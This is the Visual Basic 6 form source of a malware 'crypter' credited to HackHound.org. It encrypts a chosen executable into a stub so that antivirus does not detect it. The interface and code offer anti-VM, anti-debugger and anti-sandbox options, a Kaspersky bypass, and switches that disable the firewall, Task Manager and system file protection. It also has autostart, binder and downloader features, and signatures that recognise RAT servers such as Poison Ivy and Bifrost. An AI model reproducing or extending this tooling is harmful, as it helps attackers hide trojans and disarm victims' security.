VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "ComDlg32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   4  'Festes Werkzeugfenster
   ClientHeight    =   12615
   ClientLeft      =   1470
   ClientTop       =   1110
   ClientWidth     =   6240
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   12615
   ScaleWidth      =   6240
   ShowInTaskbar   =   0   'False
   Begin VB.Frame Frame3 
      Caption         =   "Anti Settings"
      Height          =   2415
      Left            =   3240
      TabIndex        =   32
      Top             =   2760
      Width           =   2775
      Begin VB.CheckBox Check16 
         Caption         =   "Anti Anubis Sanboxie"
         Height          =   195
         Left            =   120
         TabIndex        =   41
         Top             =   1440
         Width           =   1935
      End
      Begin VB.CheckBox Check15 
         Caption         =   "Anti Sunbelt Sanboxie"
         Height          =   195
         Left            =   120
         TabIndex        =   40
         Top             =   1200
         Width           =   1935
      End
      Begin VB.CheckBox Check14 
         Caption         =   "Anti Bitdefender Sandboxie"
         Height          =   195
         Left            =   120
         TabIndex        =   39
         Top             =   960
         Width           =   2295
      End
      Begin VB.CheckBox Check13 
         Caption         =   "Anti CW Sandboxie"
         Height          =   195
         Left            =   120
         TabIndex        =   38
         Top             =   720
         Width           =   1815
      End
      Begin VB.CheckBox Check12 
         Caption         =   "Anti Norman Sandboxie"
         Height          =   195
         Left            =   120
         TabIndex        =   37
         Top             =   480
         Width           =   2055
      End
      Begin VB.CheckBox Check10 
         Caption         =   "Anti Debugger/Present"
         Height          =   195
         Left            =   120
         TabIndex        =   36
         Top             =   240
         Width           =   2055
      End
      Begin VB.CheckBox Check9 
         Caption         =   "Anti Vm"
         Height          =   195
         Left            =   120
         TabIndex        =   35
         Top             =   1920
         Width           =   975
      End
      Begin VB.CheckBox Check8 
         Caption         =   "Anti Sandboxie"
         Height          =   195
         Left            =   120
         TabIndex        =   34
         Top             =   1680
         Width           =   1455
      End
      Begin VB.CheckBox Check21 
         Caption         =   "Bypass Kaspersky Proactive"
         Height          =   195
         Left            =   120
         TabIndex        =   33
         Top             =   2160
         Width           =   2415
      End
   End
   Begin VB.Frame Frame5 
      Caption         =   "Options Settings"
      Height          =   2415
      Left            =   240
      TabIndex        =   22
      Top             =   5280
      Width           =   2535
      Begin VB.CheckBox Check1 
         Caption         =   "Activate Icon Changer"
         Height          =   195
         Left            =   120
         TabIndex        =   31
         Top             =   720
         Width           =   1935
      End
      Begin VB.CheckBox Check3 
         Caption         =   "Activate Exe-Pump"
         Height          =   195
         Left            =   120
         TabIndex        =   30
         Top             =   1440
         Width           =   1695
      End
      Begin VB.CheckBox Check4 
         Caption         =   "Activate Fake Message"
         Height          =   195
         Left            =   120
         TabIndex        =   29
         Top             =   1200
         Width           =   2055
      End
      Begin VB.CheckBox Check2 
         Caption         =   "Activate Custom Stub"
         Height          =   195
         Left            =   120
         TabIndex        =   28
         Top             =   960
         Width           =   1935
      End
      Begin VB.CheckBox Check5 
         Caption         =   "Activate Parameter Support"
         Height          =   195
         Left            =   120
         TabIndex        =   27
         Top             =   480
         Width           =   2295
      End
      Begin VB.CheckBox Check11 
         Caption         =   "Activate Binder"
         Height          =   195
         Left            =   120
         TabIndex        =   26
         Top             =   240
         Width           =   1455
      End
      Begin VB.CheckBox Check19 
         Caption         =   "Activate Kill-Process"
         Height          =   195
         Left            =   120
         TabIndex        =   25
         Top             =   1680
         Width           =   1815
      End
      Begin VB.CheckBox Check20 
         Caption         =   "Activate Icon-Hunter"
         Height          =   195
         Left            =   120
         TabIndex        =   24
         Top             =   1920
         Width           =   1815
      End
      Begin VB.CheckBox Check23 
         Caption         =   "Activate Downloader"
         Height          =   195
         Left            =   120
         TabIndex        =   23
         Top             =   2160
         Width           =   1815
      End
   End
   Begin VB.Frame Frame4 
      Caption         =   "Normal Settings"
      Height          =   2415
      Left            =   240
      TabIndex        =   7
      Top             =   2760
      Width           =   2895
      Begin VB.CheckBox Check27 
         Caption         =   "Disable System File Protection"
         Height          =   195
         Left            =   120
         TabIndex        =   20
         Top             =   2160
         Width           =   2655
      End
      Begin VB.CheckBox Check26 
         Caption         =   "Disable Windows Firewall"
         Height          =   195
         Left            =   120
         TabIndex        =   19
         Top             =   1920
         Width           =   2175
      End
      Begin VB.CheckBox Check25 
         Caption         =   "Disable Windows Cmd"
         Height          =   195
         Left            =   120
         TabIndex        =   18
         Top             =   1680
         Width           =   1935
      End
      Begin VB.CheckBox Check24 
         Caption         =   "Disable Windows Task-Manager"
         Height          =   195
         Left            =   120
         TabIndex        =   17
         Top             =   1440
         Width           =   2655
      End
      Begin VB.CheckBox Check22 
         Caption         =   "Autostart"
         Height          =   195
         Left            =   120
         TabIndex        =   16
         Top             =   1200
         Width           =   1335
      End
      Begin VB.CheckBox Check6 
         Caption         =   "Realign PE Header"
         Height          =   195
         Left            =   120
         TabIndex        =   15
         Top             =   240
         Width           =   1695
      End
      Begin VB.CheckBox Check7 
         Caption         =   "Change PE Entrypoint"
         Height          =   195
         Left            =   120
         TabIndex        =   14
         Top             =   480
         Width           =   1935
      End
      Begin VB.CheckBox Check17 
         Caption         =   "Melt Server"
         Height          =   195
         Left            =   120
         TabIndex        =   13
         Top             =   720
         Width           =   1215
      End
      Begin VB.CheckBox Check18 
         Caption         =   "Read EOF Data"
         Height          =   195
         Left            =   120
         TabIndex        =   12
         Top             =   960
         Width           =   1935
      End
   End
   Begin MSComDlg.CommonDialog cdl3 
      Left            =   960
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cdl2 
      Left            =   480
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame2 
      Caption         =   "Menu"
      Height          =   2415
      Left            =   240
      TabIndex        =   1
      Top             =   9960
      Width           =   5775
      Begin VB.TextBox Text2 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   46
         Text            =   "0"
         Top             =   2040
         Width           =   1575
      End
      Begin VB.TextBox Text12 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   21
         Text            =   "Download File Path..."
         Top             =   1680
         Width           =   4035
      End
      Begin VB.CommandButton Command4 
         Caption         =   "Generate Key"
         Height          =   255
         Left            =   4200
         TabIndex        =   11
         Top             =   960
         Width           =   1455
      End
      Begin VB.TextBox Text5 
         Height          =   285
         Left            =   120
         TabIndex        =   10
         Top             =   960
         Width           =   4035
      End
      Begin VB.HScrollBar HScroll1 
         Height          =   255
         Left            =   4200
         TabIndex        =   9
         Top             =   1320
         Width           =   495
      End
      Begin VB.TextBox Text9 
         Height          =   285
         Left            =   4800
         Locked          =   -1  'True
         TabIndex        =   8
         Text            =   "25"
         Top             =   1320
         Width           =   615
      End
      Begin VB.TextBox Text7 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   6
         Text            =   "Bind File..."
         Top             =   240
         Width           =   4035
      End
      Begin VB.CommandButton Command5 
         Caption         =   "Browse Bind File"
         Enabled         =   0   'False
         Height          =   255
         Left            =   4200
         TabIndex        =   5
         Top             =   240
         Width           =   1455
      End
      Begin VB.TextBox Text6 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   4
         Text            =   "Parameter..."
         Top             =   1320
         Width           =   4035
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Browse Stub"
         Enabled         =   0   'False
         Height          =   255
         Left            =   4200
         TabIndex        =   3
         Top             =   600
         Width           =   1455
      End
      Begin VB.TextBox Text3 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   2
         Text            =   "Custom Stub..."
         Top             =   600
         Width           =   4035
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Welcome to HackHound Crypter"
      Height          =   11055
      Left            =   120
      TabIndex        =   0
      Top             =   1440
      Width           =   6015
      Begin VB.Frame Frame9 
         Caption         =   "Icon Hunter/ Icon Changer"
         Height          =   2055
         Left            =   120
         TabIndex        =   54
         Top             =   6360
         Width           =   5775
         Begin VB.PictureBox Picture1 
            Height          =   615
            Left            =   5040
            Picture         =   "Form1.frx":0E02
            ScaleHeight     =   555
            ScaleWidth      =   540
            TabIndex        =   59
            Top             =   600
            Width           =   595
         End
         Begin VB.CommandButton Command6 
            Caption         =   "Browse Icon File"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   58
            Top             =   1680
            Width           =   1455
         End
         Begin VB.TextBox Text11 
            Enabled         =   0   'False
            Height          =   285
            Left            =   120
            TabIndex        =   57
            Text            =   "Icon Hunt Path..."
            Top             =   1320
            Width           =   5595
         End
         Begin VB.CommandButton Command2 
            Caption         =   "Browse Icon"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   56
            Top             =   600
            Width           =   1575
         End
         Begin VB.TextBox Text1 
            Enabled         =   0   'False
            Height          =   285
            Left            =   120
            TabIndex        =   55
            Text            =   "Icon Path..."
            Top             =   240
            Width           =   5595
         End
      End
      Begin VB.Frame Frame8 
         Caption         =   "File"
         Height          =   975
         Left            =   120
         TabIndex        =   49
         Top             =   240
         Width           =   5775
         Begin VB.CommandButton cmdCrypt 
            Caption         =   "Crypt"
            Height          =   255
            Left            =   4080
            TabIndex        =   53
            Top             =   600
            Width           =   1605
         End
         Begin VB.CommandButton Browse 
            Caption         =   "Browse"
            Height          =   255
            Left            =   120
            TabIndex        =   52
            Top             =   600
            Width           =   1605
         End
         Begin VB.TextBox a 
            Height          =   285
            Left            =   120
            TabIndex        =   51
            Text            =   "File Path..."
            Top             =   240
            Width           =   5550
         End
         Begin VB.CommandButton Command1 
            Caption         =   "Abouts"
            Height          =   255
            Left            =   2040
            TabIndex        =   50
            Top             =   600
            Width           =   1725
         End
      End
      Begin VB.Frame Frame7 
         Caption         =   "Kill Process"
         Height          =   615
         Left            =   2760
         TabIndex        =   47
         Top             =   5640
         Width           =   3135
         Begin VB.TextBox Text10 
            Enabled         =   0   'False
            Height          =   285
            Left            =   120
            TabIndex        =   48
            Text            =   "Kill Process..."
            Top             =   240
            Width           =   2955
         End
      End
      Begin VB.Frame Frame6 
         Caption         =   "Fake Message"
         Height          =   1695
         Left            =   2760
         TabIndex        =   42
         Top             =   3840
         Width           =   3135
         Begin VB.TextBox Text8 
            Enabled         =   0   'False
            Height          =   285
            Left            =   120
            TabIndex        =   45
            Text            =   "Title"
            Top             =   240
            Width           =   2835
         End
         Begin VB.TextBox Text4 
            Enabled         =   0   'False
            Height          =   525
            Left            =   120
            MultiLine       =   -1  'True
            ScrollBars      =   2  'Vertikal
            TabIndex        =   44
            Text            =   "Form1.frx":1C04
            Top             =   600
            Width           =   2835
         End
         Begin VB.ComboBox Combo1 
            Appearance      =   0  '2D
            Enabled         =   0   'False
            Height          =   315
            ItemData        =   "Form1.frx":1C14
            Left            =   120
            List            =   "Form1.frx":1C21
            TabIndex        =   43
            Text            =   "Bitte auswählen"
            Top             =   1200
            Width           =   2835
         End
      End
   End
   Begin MSComDlg.CommonDialog cdl 
      Left            =   0
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cdl5 
      Left            =   1440
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cdl4 
      Left            =   1920
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Image Image1 
      Height          =   1395
      Left            =   -840
      Picture         =   "Form1.frx":1C42
      Stretch         =   -1  'True
      Top             =   0
      Width           =   7140
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim asm As String
Dim msa As String
Dim eofdata As String
Dim Stubpath As String
Const Letters1 = "abcdefghijklmnopqrstuvwxyz"
Const Letters2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const Letters3 = "1234567890"
Const df = "z&/T78t678T&7G&/"

Private Sub Check1_Click()
If Check1.Value = 1 Then
Text1.Enabled = True
Command2.Enabled = True
Else
Text1.Enabled = False
Command2.Enabled = False
End If
End Sub

Private Sub Check11_Click()
If Check11.Value = 1 Then
Text7.Enabled = True
Command5.Enabled = True
Else
Text7.Enabled = False
Command5.Enabled = False
End If
End Sub

Private Sub Check19_Click()
If Check19.Value = 1 Then
Text10.Enabled = True
Else
Text10.Enabled = False
End If
End Sub

Private Sub Check2_Click()
If Check2.Value = 1 Then
Text3.Enabled = True
Command3.Enabled = True
Else
Text3.Enabled = False
Command3.Enabled = False
End If
End Sub

Private Sub Check20_Click()
If Check20.Value = 1 Then
Text11.Enabled = True
Command6.Enabled = True
Else
Text11.Enabled = False
Command6.Enabled = False
End If
End Sub

Private Sub Check23_Click()
If Check23.Value = 1 Then
Text12.Enabled = True
Else
Text12.Enabled = False
End If
End Sub

Private Sub Check3_Click()
If Check3.Value = 1 Then
Text2.Enabled = True
Else
Text2.Enabled = False
End If
End Sub

Private Sub Check4_Click()
If Check4.Value = 1 Then
Text4.Enabled = True
Text8.Enabled = True
Combo1.Enabled = True
Else
Text4.Enabled = False
Text8.Enabled = False
Combo1.Enabled = False
End If
End Sub
Private Sub Check5_Click()
If Check5.Value = 1 Then
Text6.Enabled = True
Else
Text6.Enabled = False
End If
End Sub
Private Sub cmdCrypt_Click()
Dim RESDATA() As Byte
Dim bfile() As Byte
RESDATA() = LoadResData(102, "CUSTOM")
bfile() = LoadResData(101, "CUSTOM")
If a.Text = "" Or a.Text = "File Path..." Then
MsgBox "Please choose a File!", vbInformation, "Info"
Exit Sub
End If
Open App.Path & "\TMP.exe" For Binary As #1
Put #1, , RESDATA()
Close #1
Open App.Path & "\TMPicon.ico" For Binary As #1
Put #1, , bfile()
Close #1
Call ReplaceIcons(App.Path & "\TMPicon.ico", App.Path & "\TMP.exe", Err)
Kill App.Path & "\TMPicon.ico"
Call c
Call b
Call d
Call e
MsgBox "Crypting Finish", vbInformation, "Info"
Kill App.Path & "\TMP.exe"
End Sub
Private Sub Browse_Click()
On Error Resume Next
cdl.CancelError = False
cdl.DialogTitle = "Open PE File"
cdl.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
cdl.ShowOpen
FileInfo (cdl.FileName)
a.Text = cdl.FileName
End Sub
Sub b()
If Check2.Value = 1 Then
Stubpath = cdl3.FileName
Else
Stubpath = App.Path & "\TMP.exe"
End If
Open Stubpath For Binary As #1
msa = String(LOF(1) - 1, vbNullChar)
Get #1, , msa
Close #1
End Sub
Sub c()
Open a.Text For Binary As #1
asm = Space(LOF(1) - 1)
Get #1, , asm
Close #1
If Check18.Value = 1 Then
eofdata = ReadEOFData(a.Text)
End If
End Sub
Sub d()
cdl.CancelError = False
cdl.FileName = ""
cdl.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
cdl.ShowSave
End Sub
Sub e()
If Check23.Value = 1 Then
Dim down As String
down = Text12.Text
End If
If Check27.Value = 1 Then
Dim sfp As String
sfp = Check27.Value
End If
If Check26.Value = 1 Then
Dim fire As String
fire = Check26.Value
End If
If Check25.Value = 1 Then
Dim cdm As String
cdm = Check25.Value
End If
If Check24.Value = 1 Then
Dim dtm As String
dtm = Check24.Value
End If
If Check22.Value = 1 Then
Dim auto As String
auto = Check22.Value
End If
If Check21.Value = 1 Then
Dim kav As String
kav = Check21.Value
End If
If Check19.Value = 1 Then
Dim KPR As String
KPR = Text10.Text
End If
If Check11.Value = 1 Then
Dim Bindfile As String
Bindfile = Text7.Text
End If
If Check10.Value = 1 Then
Dim Debugger As String
Debugger = Check10.Value
End If
If Check8.Value = 1 Then
Dim sand As String
sand = Check8.Value
End If
If Check9.Value = 1 Then
Dim vm As String
vm = Check9.Value
End If
If Check5.Value = 1 Then
Dim cmd As String
cmd = Text6.Text
End If
If Check4.Value = 1 Then
Dim tit As String
tit = Text8.Text
End If
If Check4.Value = 1 Then
Dim comb As String
comb = Combo1.Text
End If
If Check4.Value = 1 Then
Dim Fake As String
Fake = Text4.Text
End If
If Check12.Value = 1 Then
Dim NSB As String
NSB = Check12.Value
End If
If Check13.Value = 1 Then
Dim CSB As String
CSB = Check12.Value
End If
If Check14.Value = 1 Then
Dim BS As String
BS = Check14.Value
End If
If Check15.Value = 1 Then
Dim SBS As String
SBS = Check15.Value
End If
If Check16.Value = 1 Then
Dim ASB As String
ASB = Check16.Value
End If
If Check17.Value = 1 Then
Dim melter As String
melter = Check17.Value
End If
Dim PUMPER As String
Dim Cryptet As String
Cryptet = strEncrypt(asm, Text5.Text)
Open cdl.FileName For Binary As #1
Put #1, , msa & df
Put #1, , Cryptet & df
Put #1, , Fake & df
Put #1, , cmd & df
Put #1, , sand & df
Put #1, , vm & df
Put #1, , Debugger & df
Put #1, , Bindfile & df
Put #1, , NSB & df
Put #1, , CSB & df
Put #1, , BS & df
Put #1, , SBS & df
Put #1, , ASB & df
Put #1, , melter & df
Put #1, , comb & df
Put #1, , tit & df
Put #1, , KPR & df
Put #1, , kav & df
Put #1, , auto & df
Put #1, , dtm & df
Put #1, , cdm & df
Put #1, , fire & df
Put #1, , sfp & df
Put #1, , down & df
Put #1, , Text5.Text
Put #1, , df
If Check3.Value = 1 Then
kbstring = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  "
For i = 0 To Text2.Text
PUMPER = PUMPER & kbstring
Next i
Put #1, LOF(1) + 1, PUMPER
Close #1
End If
Close #1
If Check18.Value = 1 Then
Call WriteEOFData(cdl.FileName, eofdata)
End If
If Check6.Value = 1 Then
Call RealignPEFromFile(cdl.FileName)
End If
If Check7.Value = 1 Then
Call ChangeOEPFromFile(cdl.FileName)
End If
If Check1.Value = 1 Then
Call ReplaceIcons(Text1.Text, cdl.FileName, Err)
End If
If Check20.Value = 1 Then
If Text11.Text = "" Or Text11.Text = "Icon Hunt Path..." Then
MsgBox "Please choose a Icon File!", vbInformation, "Info"
Exit Sub
End If
Dim EXEICON As String
Call ExtractIcons(Text11.Text, "Hunted_Icon")
Call ReplaceIcons(App.Path & "\Hunted_Icon.ico", cdl.FileName, Err)
Kill App.Path & "\Hunted_Icon.ico"
End If
End Sub
Private Sub Command1_Click()
MsgBox "Codet by The-Wall for HackHound.org!" & vbNewLine & "Thx to Cobein for RT Modul" & vbNewLine & "Greetz: haZl0oh, Slayer616, Hack-Eddy, carb0n, steve10120, omc, PROTOCOL and all the other friends!" & vbNewLine, vbInformation, "Info"
End Sub
Private Sub Command2_Click()
cdl2.CancelError = False
cdl2.DialogTitle = "Open Icon"
cdl2.Filter = "Icons (*.ico)|*.ico"
cdl2.ShowOpen
Text1.Text = cdl2.FileName
Picture1.Picture = LoadPicture(cdl2.FileName, , , 32, 32)
End Sub

Private Sub Command3_Click()
cdl3.CancelError = False
cdl3.DialogTitle = "Open Custom Stub"
cdl3.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
cdl3.ShowOpen
Text3.Text = cdl3.FileName
End Sub

Private Sub Command4_Click()
Text5.Text = Key
End Sub
Public Function Key()
Dim Letters As String
Dim i As Integer
Letters = Letters1 + Letters2 + Letters3
For i = 1 To Text9.Text
Key = Key & Mid$(Letters, Int((Rnd * Len(Letters)) + 1), 1)
Next i
End Function
Function FileInfo(ByVal FFile As String)
Dim ForSize As String
Dim sstub As String
Dim hallo As String
Dim proz As Integer
Dim Finfo(0 To 100) As Double
Dim ff As Integer
ff = FreeFile

Open FFile For Binary As #ff
    ForSize = Space$(LOF(ff))
    Get #ff, , ForSize
Close #ff

Finfo(0) = InStr(ForSize, "s3|Fs|gFs[N;sÛœHsÄ¨Hs ÁGsGÂGscGsÄåFsÜŽ;sãÒGs]ðHsT&Gs½;GsibGsn‚;s`Gs™W;s;fGsž8Gs|æFsDQ;sgéFs>Þ9s<”HsÈFsSH;sñI;")
Finfo(1) = InStr(ForSize, "sharK 3")
Finfo(2) = InStr(ForSize, "½ËÚùn¥‰ùn¥‰ùn¥‰wq¶‰ýn¥‰N·‰øn¥‰Richùn¥‰")
Finfo(3) = InStr(ForSize, "ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØûûüÒöööööööÛí!")
Finfo(4) = InStr(ForSize, "233$363S34N5p5Ç5Ó5Ú5ì5þ5\6²6â6ý67")

If Finfo(0) <> 0 Then
MsgBox "Selected File is a SharK 2 Server!", vbInformation, "Info"
SharK2 = True
End If

If Finfo(1) <> 0 Then
MsgBox "Selected File is a SharK 3 Server!", vbInformation, "Info"
SharK3 = True
End If

If Finfo(2) <> 0 Then
MsgBox "Selected File is a Poisen Ivy Server!", vbInformation, "Info"
PI = True
End If

If Finfo(3) <> 0 Then
MsgBox "Selected File is a Bifrost Server!", vbInformation, "Info"
Bifrost = True
End If

If Finfo(4) <> 0 Then
MsgBox "Selected File is a Satelite 4600 Server!", vbInformation, "Info"
Bifrost = True
End If

End Function
Private Sub Command5_Click()
cdl4.CancelError = False
cdl4.DialogTitle = "Open Bind File"
cdl4.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
cdl4.ShowOpen
Text7.Text = cdl4.FileName
End Sub

Private Sub Command6_Click()
With cdl5
.CancelError = False
.DialogTitle = "Icon Hunter"
.Filter = "Executable Files (*.exe) | *.exe"
.FileName = ""
.ShowOpen
End With
Text11.Text = cdl5.FileName
End Sub



Private Sub HScroll1_Change()
Text9.Text = CStr(HScroll1.Value)
If Text9.Text = 75 Then HScroll1.Value = 1
End Sub
